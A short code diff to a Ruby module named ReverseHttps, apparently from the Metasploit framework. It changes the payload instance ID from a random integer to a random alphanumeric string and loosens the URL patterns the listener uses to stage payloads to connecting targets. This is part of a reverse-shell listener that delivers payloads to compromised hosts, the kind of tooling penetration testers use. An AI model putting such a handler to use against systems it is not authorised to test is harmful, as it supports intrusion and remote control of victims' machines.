@@ -39,7 +39,7 @@ module ReverseHttps
 			[
 				OptString.new('LHOST', [ true, "The local listener hostname" ]),
 				OptPort.new('LPORT', [ true, "The local listener port", 8443 ]),
-				OptInt.new('TARGETID', [ false, "The ID number of this specific instance", rand(1_000_000)]),
+				OptString.new('TARGETID', [ false, "The ID of this specific payload instance", Rex::Text.rand_text_alphanumeric(8)]),
 			], Msf::Handler::ReverseHttps)
 	end
 
@@ -104,7 +104,7 @@ protected
 
 		# Process the requested resource.
 		case req.relative_resource
-			when /\/A(\d+)/
+			when /\/A(.+)/
 				target_id = $1
 
 				print_status("#{cli.peerhost}:#{cli.peerport} Staging connection for target #{target_id} received...")
@@ -114,7 +114,7 @@ protected
 				resp.body = obj.prestage_payload + obj.stage_payload(target_id)
 
 
-			when /\/B(\d+)/
+			when /\/B(.+)/
 				target_id = $1
 
 				# This is the second connection from the actual stage, hand the socket
